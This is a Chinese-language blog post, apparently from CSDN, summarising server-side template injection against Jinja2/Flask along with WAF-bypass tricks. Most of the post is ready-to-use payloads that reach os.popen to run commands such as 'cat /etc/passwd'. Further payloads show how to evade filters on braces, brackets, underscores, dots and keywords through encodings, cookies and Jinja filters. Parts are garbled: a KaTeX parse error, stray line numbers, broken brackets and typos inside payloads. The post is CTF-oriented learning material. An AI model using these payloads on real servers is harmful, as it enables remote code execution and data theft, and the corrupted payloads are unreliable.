````
# 2024年最全SSTI模板注入详细总结及WAF绕过_fenjing ssti(3)，2024年最新已开源

[2024年最全SSTI模板注入详细总结及WAF绕过_fenjing ssti(3)，2024年最新已开源-CSDN博客](https://blog.csdn.net/2401_84253894/article/details/138472587)

Dear {{7*7}}

这样的结果会导致 Twig 引擎将 7*7 这个表达式作为模板代码进行执行，从而使攻击者能够执行任意的代码。

如何判断对方的模板？
常见模板有Smarty、Mako、Twig、Jinja2、Eval、Flask、Tornado、Go、Django、Ruby等。以下是一张广为流传的图：

![4dbe0443d97644639229c2a62da325ce.png](https://img-blog.csdnimg.cn/4dbe0443d97644639229c2a62da325ce.png)

这幅图的含义是通过这些指令去判断对方用的是什么模板，下面解释一下这幅图的意思:
  绿色箭头是执行成功，红色箭头是执行失败。
首先是注入KaTeX parse error: Undefined control sequence: \* at position 3: {7\̲*̲7}没有回显出49的情况，这种…{7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{*comment*}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${“z”.join(“ab”)}，如果执行成功回显出zab就说明是Mako模板。实际做题时也可以把指令都拿去测测看谁能对上。平时做题也可以多搜集不同模板对应的注入语句语法。

```
__class__用来查看变量所属的类

__bases__用来查看类的基类，就是父类（或者__base__）

__mro__：显示类和基类

__subclasses__()：查看当前类的子类

__getitem__：对数组字典的内容提取
__init__  : 初始化类，返回的类型是function

__globals__:查看全局变量，有哪些可用的函数方法等，然后再搜索popen，eval等

__builtins__:提供对Python的所有"内置"标识符的直接访问,即先加载内嵌函数再调用

__import__   ： 动态加载类和函数，用于导入模块，经常用于导入os模块（例如__import__(‘os’).popen(‘ls’).read()）
url_for ：flask的方法，可以用于得到__builtins__
lipsum ：flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__[‘os’].popen(‘ls’).read()}}
config：当前application的所有配置。

popen():执行一个 shell 以运行命令来开启一个进程
```

如果是初次接触的话主要是理解前八个

**Python里的继承关系：**
Python里有父类和子类，比如说我是子类A,我完成不了的事情我去找父类object，让父类去找别的子类帮我做，object是父类关系的顶端。

比如以下继承关系：

```
class A:pass
class B(A):pass
class C(B):pass
class D(B):pass
c=C()
```

print(c.__class__)(当前类C)

print(c.__class__.__base__)(当前类C的父类B）

print(c.__class__.__base__.__base__)(父类的父类即A)

print(c.__class__.__base__.__base__.__base__)（最终是object）

print(c.__class__.__base__.__subclasses__())(罗列出父类B下所有子类，即类C和类D）

print(c.__class__.__base__.__subclasses__()[1])(如果类C排在类D前面，这里就是调用父类B下的子类D，如果[1]换成[0]就是调用子类C)

{{‘’.class__}}里的两个单引号意思是随便找一个对象，我们会在网上看到别人的wp有时候是{{().class__}}，{{“”.class__}}或者{{[].class__}}区别只是包裹的是字符，元组还是列表，仅是返回的数据类型不同，本质无区别，如果被过滤可以互相替代。

(但是只有被重载后的init才有正常method有globals，slot_wrapper和builtin method没有，所以才要去找被重载了init的子类)

各种payload示例：
通过config，调用os
{{config.__class__.__init__.__globals__[‘os’].popen(‘ls’).read()}}

无过滤的情况下也可以直接{{config}}看看能不能撞上flag（？）

通过url_for，调用os
{{url_for.__globals__.os.popen(‘ls’).read()}}

在已加载os模块的子类里直接调用os模块
{{“”.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[‘os’].popen(“ls”).read()}}

{{“”.__class__.__base__.__subclasses__()[117].__init__.__globals__[‘builtins’]‘eval’}}

importlib类执行命令
importlib类执行命令相当于自己导入，可以加载第三方库，使用load_module加载os

{{[].__class__.__base__.__subclasses__()[69].“load_module”“popen”.read()}}

linecache函数执行命令
linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

{{[].__class__.__base__.__subclasses__()[19].__init__.__globals__.linecache.os.popen(“ls”).read()}}

subprocess.Popen类执行命令
从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

{{().__class__.__base__.__subclasses__()13.communicate()[0].strip()}}

WAF绕过：
1、{%%}绕过过滤{{}}
尝试{%%}，想回显内容在外面加个print就行，

{%print(“”.__class__)%}

2、getitem()绕过[]过滤
getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。

原本是[117]，中括号被ban就用

__getitem__(117)代替[117]

3、request方法绕过：
request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。

request.args.key  #获取get传入的key的值

request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get

request.cookies.key  #获取cookies传入参数

request.headers.key  #获取请求头请求参数

request.data  #获取post传入参数(Content-Type:a/b)

request.json  #获取post传入json参数 (Content-Type: application/json)

request绕过单双引号过滤

![066c2df7a9f7414a95a5b933e5db0050.png](https://img-blog.csdnimg.cn/066c2df7a9f7414a95a5b933e5db0050.png)


同理单双引号也可以用cookies绕过
{{().__class__.base__.__subclasses__()[117].__init__.__globals__request.cookies.k1.read()}}

改包添加cookie

Cookie:k1=popen;k2=cat /etc/passwd

4、绕过下划线过滤:
1.使用request方法
GET提交URL?cla=__class__&bas=__base__&sub=__subclasses__&ini=__init__&glo=__globals__&gei=__getitem__

POST提交:

code={{()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(lequest.args.ini)|attr(request.args.glo)|attr(request.args.gei)(‘popen’(‘cat /etc/passwd’)attr(‘read’)()}}

2、使用Unicode编码
前置知识:

①‘’|attr(“__class__”)等效于‘’.__class__

②如果要使用xxx.os(‘xxx’)类似的方法，可以使用xxx|attr(“os”)(‘xxx’)

③使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块

Unicode编码的python脚本如下：

class_name = "cat /flag"

unicode_class_name = ''.join(['\\u{:04x}'.format(ord(char)) for char in class_name])

print(unicode_class_name)
1
2
3
4
5
payload示例：

url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22))%}

（Unicode编码，这条payload等效于{{“”.__class__}}）

3、使用十六进制编码
{{()[“\x5f\x5fclass\x5f\x5f”][“\x5f\x5finit\x5f\x5f”][“\x5f\x5fglobals\x5f\x5f”][“os”].popen(“ls”).read()}}

这条payload等效于{{“”.__class__.__init__.globals__.os.popen(“ls”).read()}}

4、同理有base64编码绕过
5、格式化字符串
{{()|attr(“%c%cclass%c%c”%(95,95,95,95))|attr(“%c%cbase%c%c”%(95,95,95,95))|attr(“%c%csubclasses%c%c”%(95,95,95,95))()|attr(“%c%cgetitem%c%c”%(95,95,95,95))(117)|attr(“%c%cinit%c%c”%(95,95,95,95))|attr(“%c%cglobals%c%c”%(95,95,95,95))|attr(“%c%cgetitem%c%c”%(95,95,95,95))(‘popen’)(‘cat /etc/passwd’)|attr(‘read’)()}}

%c %(95) 即下划线(如果是在 hackbar 注入，需要将%编码为%25。在 URL中%是一个特殊字符，用于表示后面紧跟着两个十六进制数字的转义序列，如果想在 URL中包含%字符本身，需要对它进行额外的编码，将%编码成%25)

5、绕过点过滤
1、中括号[]代替点
{{()[‘class’][‘base’]‘subclasses’[117][‘init’][‘globals’]‘popen’‘read’}}

2、如果中括号也被过滤可以考虑attr()绕过
{{()|attr(‘__class__’)|attr(‘__base__’)|attr(‘__subclasses__’)()|attr(‘__getitem__’)(199)|attr(‘__init__’)|attr(‘__globals__’)|attr(‘__getitem__’)(‘os’)|attr(‘popen’)(‘ls’)|attr(‘read’)()}}

过滤器:
flask常用过滤器:

length(): 获取一个序列或者字典的长度并将其返回

int(): 将值转换为int类型;

float():  将值转换为float类型

lower():  将字符串转换为小写

upper():  将字符串转换为大写

reverse():  反转字符串;

replace(value,old,new):  将value中的old替换为new

list():  将变量转换为列表类型，

string():  将变量转换成字符串类型

join():  将一个序列中的参数值拼接成字符串,通常配合dict()混合绕过

attr():  获取对象的属性

tips：

过滤器通过管道符号(|)与变量连接
一个过滤器的输出将应用于下一个过滤器
{{ users|upper}}  #把users值转化为大写

{{ users|upper|lower }}  #把users值转化为大写然后转化为小写，最终是小写

6、绕过关键字过滤:
1、编码绕过（就是刚刚的Unicode编码那些）
2、"+"拼接
{{().__class__}}等效于{{()[‘__cla’+’ss__’]}}

{{()[‘__cla’+’ss__’][‘__ba’+’se__’] [ ‘__subc’+’__lasses__’]‘__ get’+’item__’[‘__in’+’it__’][‘__glo’+’bals__’]‘__geti’+’tem__’‘po’+’pen’‘read’}}

3、Jinjia2中的~拼接
{{()[‘__class__’]}}等价于{%set a=’__cla’%}{%set b=’ss__’%}{{()[a~b]

{%set a=’__cla’%}{%set b=’ss__%}{%set c=’__ba’%}{%set d=’se__’%}{%set e=’__subcl’%}{%set f=’asses__’%}{%set g=’__in’%}{%set h=’it__’%}{%set l=’__gl’%}{%set i=’obals__%}{%set i=’po’%}{%set k=’pen’%}{{“”[ab][cd]e~f[19][gh][li][‘os’]j~k‘read’}}

4、过滤器绕过（reverse，replace，join）
过滤器reverse

{{()[‘__class__’]}}等价于{%set a=”__ssalc__”|reverse%}{{()[a]}}

payload可以这么构造：

{%set a=”__ssalc__”|reverse%}{%set b=“__esab_
_”|reverse%}{%set c=”__sessalcbus__”|reverse%}{%set d=“__ tini__”|reverse%}{%set e=”__slabolg__”|reverse%}{%set f=”nepop”|reverse%}{{“”[a][b]c[199][d][e][‘os’]f‘read’}}

过滤器replace

{{()[‘__class__’]}}等价于{%set a=”__claee__”|replace(“ee”,“ss”)%}{{()[a]}}

过滤器join

{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}

(%set a=[‘__cla’,’ss__’]|join%}{{()[a]}}

5、利用python里的char()
{% set chr=url_for.__globals__[__builtins__].chr %}
````

